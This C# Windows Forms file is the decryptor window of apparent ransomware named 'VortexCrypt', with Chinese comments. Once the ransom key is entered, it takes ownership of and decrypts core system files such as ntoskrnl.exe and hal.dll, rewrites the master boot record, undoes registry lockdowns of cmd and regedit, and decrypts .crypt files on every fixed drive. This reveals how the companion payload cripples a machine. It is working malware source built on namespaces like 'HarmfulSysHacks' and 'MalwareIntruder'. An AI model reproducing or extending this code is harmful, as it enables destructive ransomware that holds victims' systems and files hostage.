using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VortexSecOps.AesRsaCipherMix;
using VortexSecOps.FileTraversalService;
using VortexSecOps.HarmfulSysHacks;
using VortexSecOps.Regedit_Set;

namespace _Vortex_decryptor
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            // 初始化窗体组件
            InitializeComponent();
            // 为窗体关闭事件添加处理方法
            this.FormClosing += Form2_FormClosing;
        }
        // 静态变量，用于标记是否可以关闭窗口
        public static bool canCloseWindow = true;

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            // 如果操作未完成，阻止窗口关闭并显示提示信息
            if (canCloseWindow == false)
            {
                e.Cancel = true;
                MessageBox.Show("操作未完成", "无法退出", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                // 操作完成，允许关闭窗口
                e.Cancel = false;
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            // 检查输入的 Key 值是否与 Form1 中的 Key 匹配，并且 Form1 的私钥是否存在
            if (textBox1.Text != null && textBox1.Text != string.Empty && textBox1.Text == Form1.Key)
            {
                try
                {
                    // 禁用按钮，防止重复点击
                    button1.Enabled = false;
                    // 标记操作未完成，禁止关闭窗口
                    canCloseWindow = false;
                    // 标记文件已解密
                    Form1.decryped = true;

                    #region 删除注册表项
                    // 异步删除注册表中的 VortexCrypt 子项
                    Task.Run(() =>
                    {
                        using (var reg_encryped = Registry.LocalMachine.OpenSubKey(@"SOFTWARE", true))
                        {
                            try
                            {
                                reg_encryped.DeleteSubKeyTree(@"VortexCrypt");
                            }
                            catch (Exception)
                            {
                                // 捕获异常但不做处理
                            }
                        }
                    });
                    #endregion 删除注册表项
                    // 创建一个信号量，限制并发任务数量为 100
                    var semaphore = new SemaphoreSlim(100, 100);
                    // 用于存储所有解密任务的列表
                    var decryptionTasks = new List<Task>();
                    // 创建文件遍历器实例
                    var fileTraverser = FileTraverser.Create();
                    // 创建 AES/RSA 加密服务实例
                    IAesRsaCryptographyService cryptographyService = AesRsaEncryptionManager.Create();
                    byte[] aesEncryptionKey = null;
                    if (Form1.keyAcquisition == KeyAcquisitionMethod.RemotePrivateKeyPackageViaLan)
                    {
                        if (Form1.RemoteAesKey != null && Form1.RemoteAesKey != string.Empty)
                        {
                            // 加载 AES 密钥
                            aesEncryptionKey =  Convert.FromBase64String(Form1.RemoteAesKey);
                        }
                        else
                        {
                            Form1.decryped = false;
                        }
                    }
                    else if (Form1.keyAcquisition == KeyAcquisitionMethod.ManualKeyExchange)
                    {
                        aesEncryptionKey = Convert.FromBase64String(Form1.AesKey);
                    }
                    // 解密 C 盘根目录下的 mbr.bin.crypt 文件
                    if (File.Exists(@"C:\bin\mbr.bin.crypt"))
                    {
                        cryptographyService.DecryptFileWithAesKey(@"C:\bin\mbr.bin.crypt", aesEncryptionKey); 
                    }
                    // 恢复硬件抽象层
                    if (File.Exists(@"C:\Windows\System32\hal.dll.crypt"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\hal.dll.crypt", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path, aesEncryptionKey);
                        });
                    }
                    // 恢复系统内核
                    if (File.Exists(@"C:\Windows\System32\ntoskrnl.exe.crypt"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ntoskrnl.exe.crypt", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path, aesEncryptionKey);
                        });
                    }
                    // 恢复系统完整性检查和修复工具
                    if (File.Exists(@"C:\Windows\System32\sfc.exe.crypt"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\sfc.exe.crypt", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path, aesEncryptionKey);
                        });
                    }
                    // 恢复 Microsoft 管理控制台
                    if (File.Exists(@"C:\Windows\System32\mmc.exe.crypt"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\mmc.exe.crypt", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path, aesEncryptionKey);
                        });
                    }
                    // 恢复 Windows 映像部署管理工具
                    if (File.Exists(@"C:\Windows\System32\Dism.exe.crypt"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\Dism.exe.crypt", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path, aesEncryptionKey);
                        });
                    }
                    // 恢复 Windows 恢复环境配置工具
                    if (File.Exists(@"C:\Windows\System32\ReAgentc.exe.crypt"))
                    {
                        MalwareIntruder.TakeOwnershipOfFile(@"C:\Windows\System32\ReAgentc.exe.crypt", (path) =>
                        {
                            cryptographyService.DecryptFileWithAesKey(path, aesEncryptionKey);
                        });
                    }
                    // 创建 Windows API 操作对象
                    IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
                    // 获取主引导记录数据
                    byte[] mbrdata = MalwareIntruder.GetMbrUsingWindowsAPI();
                    // 将主引导记录数据写入主引导记录
                    windowsAPIOperator.WriteToMasterBootRecord(mbrdata);

                    // 创建注册表配置器实例
                    IRegistryConfigurer registryConfigurer = RegistryConfigurer.Create();
                    // 配置 CMD 相关设置
                    registryConfigurer.ConfigureCMD(0);
                    // 配置启动程序
                    registryConfigurer.ConfigStartupProg("explorer.exe");
                    // 应用 Windows 限制设置
                    registryConfigurer.ApplyWinRestricts(false);
                    // 启用注册表编辑器
                    registryConfigurer.DisableRegistryEdit(0);
                    // 启用系统设置
                    registryConfigurer.DisableSysSettings(0);
                    // 遍历 C:\users 目录下所有扩展名为 .crypt 的文件进行解密
                    foreach (string aesDecryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\users", "*.crypt"))
                    {
                        // 等待信号量，确保并发任务不超过 100 个
                        await semaphore?.WaitAsync();
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                // 使用 AES 密钥解密文件
                                cryptographyService.DecryptFileWithAesKey(aesDecryptionNeededFilePath, aesEncryptionKey);
                                // 在列表框中显示已解密的文件路径
                                listBox1.Items.Add($"已解密：{aesDecryptionNeededFilePath}");
                            }
                            catch
                            {
                                // 捕获异常但不做处理
                            }
                            finally
                            {
                                // 释放信号量
                                semaphore?.Release();
                            }
                        });
                        // 将任务添加到任务列表中
                        decryptionTasks.Add(task);
                    }

                    // 遍历 C:\Program Files (x86) 目录下所有扩展名为 .crypt 的文件进行解密
                    foreach (string aesDecryptionNeededFilePath in fileTraverser.TraverseFile(@"C:\Program Files (x86)", "*.crypt"))
                    {
                        await semaphore.WaitAsync();
                        var task = Task.Run(() =>
                        {
                            try
                            {
                                cryptographyService.DecryptFileWithAesKey(aesDecryptionNeededFilePath, aesEncryptionKey);
                                listBox1.Items.Add($"已解密：{aesDecryptionNeededFilePath}");
                            }
                            catch
                            {
                                // 捕获异常但不做处理
                            }
                            finally
                            {
                                semaphore?.Release();
                            }
                        });
                        decryptionTasks.Add(task);
                    }

                    // 获取所有驱动器信息
                    DriveInfo[] driveInfo = DriveInfo.GetDrives();
                    // 遍历除 C 盘外的所有固定磁盘驱动器
                    foreach (DriveInfo drive in driveInfo)
                    {
                        if (drive.Name != @"C:\" && drive.DriveType == DriveType.Fixed)
                        {
                            // 遍历当前驱动器下所有扩展名为 .crypt 的文件进行解密
                            foreach (string aesDecryptionNeededFilePath in fileTraverser.TraverseFile(drive.Name, "*.crypt"))
                            {
                                await semaphore.WaitAsync();
                                var task = Task.Run(() =>
                                {
                                    try
                                    {
                                        cryptographyService.DecryptFileWithAesKey(aesDecryptionNeededFilePath, aesEncryptionKey);
                                        listBox1.Items.Add($"已解密：{aesDecryptionNeededFilePath}");
                                    }
                                    catch
                                    {
                                        // 捕获异常但不做处理
                                    }
                                    finally
                                    {
                                        semaphore?.Release();
                                    }
                                });
                                decryptionTasks.Add(task);
                            }
                        }
                    }

                    // 创建一个任务，等待所有解密任务完成
                    Task task1 = Task.WhenAll(decryptionTasks);
                    await Task.Run(() =>
                    {
                        // 等待所有解密任务完成
                        Task.WaitAny(task1);
                        // 标记操作完成，允许关闭窗口
                        canCloseWindow = true;
                    });

                    // 显示提示信息，告知用户可以正常使用电脑
                    MessageBox.Show("您现在可以正常使用电脑了，壁纸需要手动更换，祝您愉快", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    // 捕获异常并显示错误信息
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    // 允许关闭窗口
                    canCloseWindow = true;
                    button1.Enabled = true;
                    // 标记文件未解密，不允许关闭主窗口
                    Form1.decryped = false;
                }
            }
            else
            {
                // 输入的 Key 值有误，显示错误信息
                MessageBox.Show("输入的 Key 值有误", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // 空事件处理方法
        }
    }
}
